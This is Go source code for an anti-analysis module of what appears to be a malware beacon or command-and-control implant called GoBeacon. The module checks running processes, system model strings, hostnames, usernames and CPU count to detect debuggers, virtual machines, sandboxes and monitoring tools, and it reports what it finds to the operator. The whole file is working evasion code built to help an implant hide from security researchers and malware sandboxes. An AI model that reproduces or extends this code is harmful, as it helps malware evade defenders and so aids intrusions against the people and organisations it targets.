// Anti-Analysis module - Detect analysis environments

func (b *GoBeacon) moduleAntiAnalysis(parameters string) string {
	var result strings.Builder
	result.WriteString("=== ANTI-ANALYSIS CHECKS ===\n")

	checks := map[string]func() bool{
		"Check for debugger":                  b.checkDebugger,
		"Check for virtual machine":           b.checkVM,
		"Check for sandbox environment":       b.checkSandbox,
		"Check for analysis tools":            b.checkAnalysisTools,
		"Check for low resource environment":  b.checkLowResources,
	}

	for checkName, checkFunc := range checks {
		detected := checkFunc()
		status := "NOT DETECTED"
		if detected {
			status = "DETECTED"
		}
		result.WriteString(fmt.Sprintf("%s: %s\n", checkName, status))
	}

	return result.String()
}

func (b *GoBeacon) checkDebugger() bool {
	if runtime.GOOS == "windows" {
		cmd := exec.Command("tasklist")
		output, err := cmd.Output()
		if err != nil {
			return false
		}
		debuggers := []string{"ollydbg.exe", "x64dbg.exe", "windbg.exe", "ida.exe", "ida64.exe"}
		outputStr := strings.ToLower(string(output))
		for _, debugger := range debuggers {
			if strings.Contains(outputStr, debugger) {
				return true
			}
		}
	} else {
		cmd := exec.Command("ps", "aux")
		output, err := cmd.Output()
		if err != nil {
			return false
		}
		debuggers := []string{"gdb", "strace", "ltrace", "radare2"}
		outputStr := strings.ToLower(string(output))
		for _, debugger := range debuggers {
			if strings.Contains(outputStr, debugger) {
				return true
			}
		}
	}
	return false
}

func (b *GoBeacon) checkVM() bool {
	vmIndicators := []string{"vmware", "virtualbox", "vbox", "qemu", "xen", "hyperv"}

	if runtime.GOOS == "windows" {
		cmd := exec.Command("wmic", "computersystem", "get", "model")
		output, err := cmd.Output()
		if err == nil {
			outputStr := strings.ToLower(string(output))
			for _, indicator := range vmIndicators {
				if strings.Contains(outputStr, indicator) {
					return true
				}
			}
		}
	} else {
		dmidecodeCmd := exec.Command("dmidecode", "-s", "system-product-name")
		output, err := dmidecodeCmd.Output()
		if err == nil {
			outputStr := strings.ToLower(string(output))
			for _, indicator := range vmIndicators {
				if strings.Contains(outputStr, indicator) {
					return true
				}
			}
		}
	}

	return false
}

func (b *GoBeacon) checkSandbox() bool {
	sandboxIndicators := []string{
		"cuckoo", "sandbox", "malware", "analysis", "analyst", "sample", "virus",
	}

	hostname, _ := os.Hostname()
	u, _ := user.Current()

	checkStrings := []string{strings.ToLower(hostname)}
	if u != nil {
		checkStrings = append(checkStrings, strings.ToLower(u.Username))
	}

	for _, checkStr := range checkStrings {
		for _, indicator := range sandboxIndicators {
			if strings.Contains(checkStr, indicator) {
				return true
			}
		}
	}

	return false
}

func (b *GoBeacon) checkAnalysisTools() bool {
	tools := []string{
		"wireshark", "tcpdump", "processhacker", "procmon", "regmon", "filemon",
		"apimonitor", "spy++", "procexp", "autoruns", "strings", "hexdump",
	}

	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("tasklist")
	} else {
		cmd = exec.Command("ps", "aux")
	}

	output, err := cmd.Output()
	if err != nil {
		return false
	}

	outputStr := strings.ToLower(string(output))
	for _, tool := range tools {
		if strings.Contains(outputStr, tool) {
			return true
		}
	}

	return false
}

func (b *GoBeacon) checkLowResources() bool {
	return runtime.NumCPU() <= 1
}
